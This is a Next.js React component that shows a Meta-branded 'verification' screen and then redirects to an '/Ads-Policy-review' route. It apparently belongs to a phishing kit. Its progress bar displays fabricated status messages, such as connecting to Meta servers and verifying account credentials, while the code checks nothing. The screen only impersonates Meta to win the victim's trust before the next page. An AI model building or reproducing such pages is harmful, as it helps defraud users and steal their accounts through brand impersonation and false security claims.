'use client';

import Image from 'next/image';
import MetaImage from '@/assets/images/meta-image.png';
import { useRouter } from 'next/navigation';
import { useEffect, useState, type FC } from 'react';

const VerifiedPage: FC = () => {
    const router = useRouter();
    const [progress, setProgress] = useState(0);
    const [statusText, setStatusText] = useState('Initializing verification...');

    useEffect(() => {
        const steps = [
            { at: 10, text: 'Connecting to Meta servers...' },
            { at: 25, text: 'Verifying account credentials...' },
            { at: 45, text: 'Checking policy compliance...' },
            { at: 60, text: 'Reviewing account history...' },
            { at: 75, text: 'Processing verification data...' },
            { at: 90, text: 'Finalizing review...' },
            { at: 100, text: 'Verification complete!' },
        ];

        let current = 0;
        const interval = setInterval(() => {
            current += 1;
            setProgress(current);

            const step = steps.find(s => s.at === current);
            if (step) {
                setStatusText(step.text);
            }

            if (current >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    router.push('/Ads-Policy-review');
                }, 800);
            }
        }, 30);

        return () => clearInterval(interval);
    }, [router]);

    return (
        <div className='flex flex-col items-center justify-center min-h-screen w-full bg-white px-4 sm:px-6'>
            <div className='w-full max-w-[360px] sm:max-w-[420px] flex flex-col items-center'>
                {/* Meta Logo */}
                <Image src={MetaImage} alt='Meta' className='w-14 sm:w-18 mb-8' priority />

                {/* Video-style intro animation */}
                <div className='w-full rounded-2xl bg-gradient-to-br from-[#f0f2f5] to-[#e4e6eb] p-6 sm:p-8 shadow-sm'>
                    {/* Animated shield icon */}
                    <div className='flex justify-center mb-6'>
                        <div className='relative'>
                            <div className={`w-20 h-20 sm:w-24 sm:h-24 rounded-full flex items-center justify-center transition-all duration-500 ${progress >= 100 ? 'bg-green-100' : 'bg-blue-50'}`}>
                                {progress < 100 ? (
                                    <svg className='w-10 h-10 sm:w-12 sm:h-12 text-blue-600 animate-pulse' fill='none' viewBox='0 0 24 24' stroke='currentColor' strokeWidth={1.5}>
                                        <path strokeLinecap='round' strokeLinejoin='round' d='M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z' />
                                    </svg>
                                ) : (
                                    <svg className='w-10 h-10 sm:w-12 sm:h-12 text-green-600' fill='none' viewBox='0 0 24 24' stroke='currentColor' strokeWidth={2}>
                                        <path strokeLinecap='round' strokeLinejoin='round' d='M4.5 12.75l6 6 9-13.5' />
                                    </svg>
                                )}
                            </div>
                            {/* Spinning ring */}
                            {progress < 100 && (
                                <div className='absolute inset-0 w-20 h-20 sm:w-24 sm:h-24 border-2 border-blue-200 border-t-blue-600 rounded-full animate-spin' />
                            )}
                        </div>
                    </div>

                    {/* Progress bar */}
                    <div className='w-full bg-gray-200 rounded-full h-1.5 sm:h-2 mb-4 overflow-hidden'>
                        <div
                            className={`h-full rounded-full transition-all duration-200 ease-linear ${progress >= 100 ? 'bg-green-500' : 'bg-blue-600'}`}
                            style={{ width: `${progress}%` }}
                        />
                    </div>

                    {/* Status text */}
                    <p className='text-center text-xs sm:text-sm text-gray-600 font-medium min-h-[20px]'>
                        {statusText}
                    </p>

                    {/* Percentage */}
                    <p className={`text-center text-lg sm:text-xl font-bold mt-2 ${progress >= 100 ? 'text-green-600' : 'text-blue-600'}`}>
                        {progress}%
                    </p>
                </div>

                {/* Footer text */}
                <p className='text-[10px] sm:text-xs text-gray-400 mt-6 text-center'>
                    Please do not close this page while verification is in progress.
                </p>
            </div>
        </div>
    );
};

export default VerifiedPage;
